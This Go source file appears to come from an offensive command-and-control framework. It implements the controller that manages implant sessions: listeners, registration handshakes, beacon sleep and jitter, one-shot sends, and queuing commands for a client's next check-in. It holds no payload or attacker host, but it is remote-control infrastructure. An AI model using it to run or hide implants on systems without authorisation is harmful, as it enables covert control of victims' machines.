package c2

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt-c2/transform"
	"github.com/iDigitalFlame/xmt/xmt-c2/wrapper"
	com "github.com/iDigitalFlame/xmt/xmt-com"
	"github.com/iDigitalFlame/xmt/xmt-com/limits"
	device "github.com/iDigitalFlame/xmt/xmt-device"
	util "github.com/iDigitalFlame/xmt/xmt-util"
)

const (
	name = "DefaultGlobal"

	maxErrors int8 = 3
)

// Controller is the default master manager for all C2 client connections.
// The controller acts as staging point to control all current connections.
var Controller *Server

var (
	// DefaultSleep is the default sleep Time when the provided sleep value is empty or negative.
	DefaultSleep = time.Duration(30) * time.Second

	// DefaultLogLevel is the default logging level used when creating a Controller without a specified
	// log level.
	DefaultLogLevel = logx.LWarning

	// DefaultClientMux is the default Mux instance that handles simple C2 server and client functions
	// from the client side.
	DefaultClientMux = muxClient(false)

	// DefaultJitter is the default Jitter value when the provided jitter value is negative.
	DefaultJitter int8 = 5
)

var (
	// ErrNoConnector is a error returned by the Connect and Listen functions when
	// the Connector is nil and the provided Profile is also nil or does not inherit
	// the Connector interface.
	ErrNoConnector = errors.New("invalid or missing connector")
	// ErrEmptyPacket is a error returned by the Connect function when
	// the expected return result from the server was invalid or not expected.
	ErrEmptyPacket = errors.New("server sent an invalid response")
)

// Server is a struct that helps manage and contains the sessions and processes events.
type Server struct {
	Log logx.Log
	Mux Scheduler

	ctx    context.Context
	name   string
	close  chan string
	events chan *callback
	cancel context.CancelFunc
	active map[string]*Handle
}
type callback struct {
	packet      *com.Packet
	session     *Session
	packetFunc  func(*Session, *com.Packet)
	sessionFunc func(*Session)
}

// Wait will block until the current controller
// is closed and shutdown.
func (s *Server) Wait() {
	<-s.ctx.Done()
}
func (s *Server) process() {
	for s.ctx.Err() == nil {
		select {
		case <-s.ctx.Done():
			return
		case r := <-s.close:
			delete(s.active, r)
		case e := <-s.events:
			e.trigger(s)
		}
	}
}

// Close stops the processing thread from this Controller and
// releases all associated resources.
func (s *Server) Close() error {
	defer func() { recover() }()
	s.cancel()
	close(s.close)
	close(s.events)
	return nil
}

// IsActive returns true if this Controller is
// still able to send and receive Packets.
func (s *Server) IsActive() bool {
	return s.ctx.Err() == nil
}
func (e *callback) trigger(s *Server) {
	defer func(x *Server) {
		if err := recover(); err != nil {
			x.Log.Error("[%s] Controller trigger function recovered from a panic! (%s)", x.name, err)
		}
	}(s)
	if e.packet != nil && e.packetFunc != nil {
		e.packetFunc(e.session, e.packet)
	}
	if e.session != nil && e.sessionFunc != nil {
		e.sessionFunc(e.session)
	}
	e.packet = nil
	e.session = nil
	e.packetFunc = nil
	e.sessionFunc = nil
}

// NewServer creates a new Server instance for manageing C2
// clients and session. If needed the default "c2.Controller" is the
// recommended Server to use.
func NewServer(n string, l logx.Log) *Server {
	s := &Server{
		Log:    l,
		name:   n,
		active: make(map[string]*Handle),
		events: make(chan *callback, limits.SmallLimit()),
	}
	s.Mux = &muxServer{
		active:     make(map[uint16]*Job),
		controller: s,
	}
	s.ctx, s.cancel = context.WithCancel(context.Background())
	s.Log.Trace("[%s] Controller started...", n)
	go s.process()
	return s
}

// Listen adds the Listener under the name provided.  A Handle struct
// to control and receive callback functions is added to assist in
// manageing connections to this Listener.
func Listen(n, b string, v com.Server, p *Profile) (*Handle, error) {
	if Controller == nil {
		Controller = NewServer(name, logx.NewConsole(DefaultLogLevel))
	}
	return Controller.Listen(n, b, v, p)
}

// Connect creates a Session using the supplied Profile to connect to
// the listening server specified.
func Connect(a string, v com.Connector, p *Profile) (*Session, error) {
	if Controller == nil {
		Controller = NewServer(name, logx.NewConsole(DefaultLogLevel))
	}
	return Controller.ConnectWith(a, v, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT
// register the device with the controller.  This is used for spending specific data
// segments in single use connections.
func Oneshot(a string, v com.Connector, p *Profile, d *com.Packet) error {
	if Controller == nil {
		Controller = NewServer(name, logx.NewConsole(DefaultLogLevel))
	}
	return Controller.Oneshot(a, v, p, d)
}

// Listen adds the Listener under the name provided.  A Handle struct
// to control and receive callback functions is added to assist in
// manageing connections to this Listener.
func (s *Server) Listen(n, b string, v com.Server, p *Profile) (*Handle, error) {
	if v == nil {
		return nil, ErrNoConnector
	}
	l, err := v.Listen(b)
	if err != nil {
		return nil, fmt.Errorf("unable to listen on \"%s\": %w", b, err)
	}
	if l == nil {
		return nil, fmt.Errorf("unable to listen on \"%s\"", b)
	}
	x := strings.ToLower(n)
	if _, ok := s.active[x]; ok {
		return nil, fmt.Errorf("listener \"%s\" is already active", x)
	}
	h := &Handle{
		name:       x,
		listener:   l,
		sessions:   make(map[uint32]*Session),
		controller: s,
	}
	if p != nil {
		h.size = p.Size
		h.Wrapper = p.Wrapper
		h.Transform = p.Transform
	}
	if h.size <= 0 {
		h.size = limits.MediumLimit()
	}
	h.close = make(chan uint32, h.size)
	h.ctx, h.cancel = context.WithCancel(s.ctx)
	s.active[x] = h
	s.Log.Debug("Added listener type \"%s\" as \"%s\"...", l, strings.ToLower(n))
	go h.listen()
	return h, nil
}

// Connect creates a Session using the supplied Profile to connect to
// the listening server specified.
func (s *Server) Connect(a string, v com.Connector, p *Profile) (*Session, error) {
	return s.ConnectWith(a, v, p, nil)
}

// Oneshot sends the packet with the specified data to the server and does NOT
// register the device with the controller.  This is used for spending specific data
// segments in single use connections.
func (s *Server) Oneshot(a string, v com.Connector, p *Profile, d *com.Packet) error {
	if v == nil {
		return ErrNoConnector
	}
	var w wrapper.Wrapper
	var t transform.Transform
	if p != nil {
		w = p.Wrapper
		t = p.Transform
	}
	i, err := v.Connect(a)
	if err != nil {
		return fmt.Errorf("unable to connect to \"%s\": %w", a, err)
	}
	defer i.Close()
	if d == nil {
		d = &com.Packet{ID: MsgPing}
	}
	d.Flags |= com.FlagOneshot
	if err := write(i, w, t, d); err != nil {
		return fmt.Errorf("unable to write packet: %w", err)
	}
	return nil
}

// ConnectWith creates a Session using the supplied Profile to connect to
// the listening server specified. This function allows for passing the data Packet
// specified to the server with the initial registration. The data will be passed on
// normally.
func ConnectWith(a string, v com.Connector, p *Profile, d *com.Packet) (*Session, error) {
	if Controller == nil {
		Controller = NewServer(name, logx.NewConsole(DefaultLogLevel))
	}
	return Controller.ConnectWith(a, v, p, d)
}

// ConnectWith creates a Session using the supplied Profile to connect to
// the listening server specified. This function allows for passing the data Packet
// specified to the server with the initial registration. The data will be passed on
// normally.
func (s *Server) ConnectWith(a string, v com.Connector, p *Profile, d *com.Packet) (*Session, error) {
	if v == nil {
		return nil, ErrNoConnector
	}
	x := limits.MediumLimit()
	if p != nil && p.Size > 0 {
		x = p.Size
	}
	n := &Session{
		ID:         device.Local.ID,
		Mux:        DefaultClientMux,
		send:       make(chan *com.Packet, x),
		recv:       make(chan *com.Packet, x),
		wake:       make(chan bool, 1),
		frags:      make(map[uint16]*com.Packet),
		errors:     maxErrors,
		Device:     device.Local.Machine,
		server:     a,
		connect:    v.Connect,
		controller: s,
	}
	n.ctx, n.cancel = context.WithCancel(s.ctx)
	if p != nil {
		n.Sleep = p.Sleep
		n.Jitter = p.Jitter
		n.wrapper = p.Wrapper
		n.transform = p.Transform
	}
	if n.Sleep <= 0 {
		n.Sleep = DefaultSleep
	}
	if n.Jitter < 0 {
		n.Jitter = DefaultJitter
	}
	i, err := v.Connect(a)
	if err != nil {
		return nil, fmt.Errorf("unable to connect to \"%s\": %w", a, err)
	}
	defer i.Close()
	z := &com.Packet{ID: MsgHello, Job: uint16(util.Rand.Uint32())}
	n.Device.MarshalStream(z)
	if d != nil {
		d.MarshalStream(z)
		z.Flags |= com.FlagData
	}
	z.Close()
	if err := write(i, n.wrapper, n.transform, z); err != nil {
		return nil, fmt.Errorf("unable to write packet: %w", err)
	}
	r, err := read(i, n.wrapper, n.transform)
	if err != nil {
		return nil, fmt.Errorf("unable to read packet: %w", err)
	}
	if r.IsEmpty() || r.ID != MsgRegistered {
		return nil, ErrEmptyPacket
	}
	s.Log.Debug("[%s] Client connected to \"%s\"...", n.ID, a)
	go n.listen()
	return n, nil
}

// Schedule will instruct the session with the specified command on the
// Client's next check-in. This function will return a Job struct that can be used to manage
// and monitor the results.
func Schedule(s *Session, p *com.Packet) (*Job, error) {
	if Controller == nil {
		Controller = NewServer(name, logx.NewConsole(DefaultLogLevel))
	}
	return Controller.Schedule(s, p)
}

// Schedule will instruct the session with the specified command on the
// Client's next check-in. This function will return a Job struct that can be used to manage
// and monitor the results.
func (s *Server) Schedule(x *Session, p *com.Packet) (*Job, error) {
	return s.Mux.Schedule(x, p)
}
